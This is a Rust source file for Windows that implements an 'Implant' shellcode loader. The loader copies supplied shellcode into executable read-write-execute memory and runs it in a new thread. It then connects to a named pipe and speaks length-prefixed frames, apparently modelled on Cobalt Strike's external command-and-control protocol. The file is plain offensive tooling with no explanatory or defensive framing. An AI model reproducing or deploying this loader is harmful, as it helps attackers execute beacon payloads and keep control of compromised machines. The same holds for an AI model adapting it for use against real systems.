use std::{
    ffi::c_void,
    io::{Error, ErrorKind, Read, Write},
    mem, ptr,
    thread::sleep,
    time::Duration,
};
use windows::{
    core::PCSTR,
    Win32::{
        Foundation::{CloseHandle, HANDLE},
        Storage::FileSystem::{
            CreateFileA, ReadFile, WriteFile, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ,
            FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
        },
        System::{
            Memory::{VirtualAlloc, MEM_COMMIT, PAGE_EXECUTE_READWRITE},
            // Pipes::WaitNamedPipeA,
            Threading::{
                CreateThread, LPTHREAD_START_ROUTINE, THREAD_CREATE_RUN_IMMEDIATELY,
            },
            IO::OVERLAPPED,
        },
    },
};

pub struct Implant {
    handle: HANDLE,
}
impl Drop for Implant {
    fn drop(&mut self) {
        unsafe {
            CloseHandle(self.handle);
        }
    }
}

impl Read for Implant {
    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        let size = buf.len();
        let mut bytes_read: u32 = 0;
        unsafe {
            if !ReadFile(
                self.handle,
                buf.as_mut_ptr() as *mut c_void,
                size.try_into().unwrap_or(u32::MAX),
                &mut bytes_read as *mut u32,
                ptr::null_mut() as *mut OVERLAPPED,
            )
            .as_bool()
            {
                return Err(Error::new(ErrorKind::Other, "Failed to read from pipe"));
            };
        };
        return Ok(bytes_read.try_into().or(Err(Error::new(
            ErrorKind::Other,
            "Failed to convert u32 to usize",
        )))?);
    }
}

impl Write for Implant {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        let mut bytes_written: u32 = 0;
        unsafe {
            if !WriteFile(
                self.handle,
                buf.as_ptr() as *const c_void,
                buf.len().try_into().unwrap_or(u32::MAX),
                &mut bytes_written as *mut u32,
                ptr::null_mut() as *mut OVERLAPPED,
            )
            .as_bool()
            {
                return Err(Error::new(ErrorKind::Other, "Failed to write to pipe"));
            };
        }
        return Ok(bytes_written.try_into().or(Err(Error::new(
            ErrorKind::Other,
            "Failed to convert u32 to usize",
        )))?);
    }

    fn flush(&mut self) -> std::io::Result<()> {
        return Ok(());
    }
}

pub trait CSFrame {
    fn read_frame(&mut self) -> Result<Vec<u8>, Box<dyn std::error::Error>>;
    fn write_frame(&mut self, data: Vec<u8>) -> Result<(), Box<dyn std::error::Error>>;
}

impl<T> CSFrame for T
where
    T: Read + Write,
{
    fn read_frame(&mut self) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let mut size_buf = [0; 4];
        self.read_exact(&mut size_buf)?;
        let size = u32::from_le_bytes(size_buf);
        let mut data = vec![0; size.try_into()?];
        self.read_exact(data.as_mut_slice())?;
        return Ok(data);
    }

    fn write_frame(&mut self, data: Vec<u8>) -> Result<(), Box<dyn std::error::Error>> {
        let size: u32 = data.len().try_into()?;
        self.write_all(&size.to_le_bytes())?;
        self.write_all(&data)?;
        return Ok(());
    }
}

pub fn create_implant_from_buf(
    shell_code: Vec<u8>,
    pipename: &str,
) -> Result<Implant, Error> {
    let full_pipename = format!("\\\\.\\pipe\\{}", pipename);
    unsafe {
        let buf =
            VirtualAlloc(ptr::null(), 512 * 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
                as *mut u8;
        ptr::copy(shell_code.as_ptr(), buf, shell_code.len());
        let buf_addr: unsafe extern "system" fn(*mut c_void) -> u32 =
            mem::transmute(buf);
        let mut threadid: u32 = 0;

        CreateThread(
            ptr::null(),
            0,
            LPTHREAD_START_ROUTINE::Some(buf_addr),
            ptr::null(),
            THREAD_CREATE_RUN_IMMEDIATELY,
            &mut threadid as *mut u32,
        )?;

        // if !WaitNamedPipeA(PCSTR(full_pipename.as_ptr()), 0).as_bool() {
        //     return Err(Error::new(ErrorKind::TimedOut, "Failed waiting for pipe"));
        // }
        let mut count = 0;
        loop {
            if let Ok(sock_handle) = CreateFileA(
                PCSTR(full_pipename.as_ptr()),
                FILE_GENERIC_READ | FILE_GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                ptr::null(),
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                HANDLE::default(),
            ) {
                return Ok(Implant {
                    handle: sock_handle,
                });
            } else {
                count += 1;
                if count > 10 {
                    return Err(Error::from(ErrorKind::Other));
                }
                sleep(Duration::from_secs(1));
            };
        }
    }
}
